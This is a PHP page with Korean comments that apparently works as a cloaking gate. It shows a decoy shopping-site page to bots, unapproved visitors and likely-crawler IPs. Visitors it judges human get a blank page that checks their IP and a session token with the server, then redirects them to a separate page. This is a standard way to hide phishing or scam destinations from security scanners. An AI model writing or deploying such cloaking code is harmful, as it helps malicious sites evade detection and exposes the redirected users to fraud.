<?php
require "common.php";

if(!$approved) {
    include "shop.php";
}else{
    if(isBot()) {
        include "shop.php";
        exit;
    }

    $clientIp = getClientIp();
    if (isLikelyBot($clientIp)) {
        // 쇼핑몰 사이트로 리다이렉트
        //echo "🤖 봇일 가능성이 높습니다: $clientIp";
        include "shop.php";
    } else {
        // 인덱스 페이지에서 머무르기
        //echo "👤 사람(또는 허용된 검색엔진)입니다: $clientIp";
    }

    // Mobile Detect global $detect
    $isIOS = $detect->isiOS();
    $jsToken = issueJsToken();
?>
<html>
    <head></head>
    <body style="background-color: black">
        <script>
            const isIOS = <?php echo $isIOS ? 'true' : 'false'; ?>;

                // fetch 재시도 로직
            function verifyToken() {
                fetch("https://api.ipify.org?format=json")
                .then(res => res.json())
                .then(data => {
                    const clientIp = data.ip; // 얻은 IP
                    const token = sessionStorage.getItem('js_token');
                    const payload = { token: token, ip: clientIp, isIOS: isIOS };

                    // Step 2: 토큰 + IP를 함께 서버로 전달
                    return fetch("/api.php", {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify(payload),
                        credentials: "include"
                    });
                })
                .then(res => res.json())
                .then(data => {
                    console.log(data)
                    if(data.status === "ok") {
                        location.href = 'redirect.html';
                    } else if(data.status === "retry") {
                        // 새 토큰 발급 → 재검증
                        sessionStorage.setItem('js_token', data.token);
                        verifyToken(data.token);
                    } else {
                        location.href = 'shop.php';
                    }
                })
                .catch(err => console.error(err));
            }

            document.addEventListener("DOMContentLoaded", function () {
                sessionStorage.setItem('js_token', "<?php echo $jsToken; ?>");

                setTimeout(() => {
                    verifyToken();
                }, 500);
            });
        </script>
    </body>
</html>
<?php
}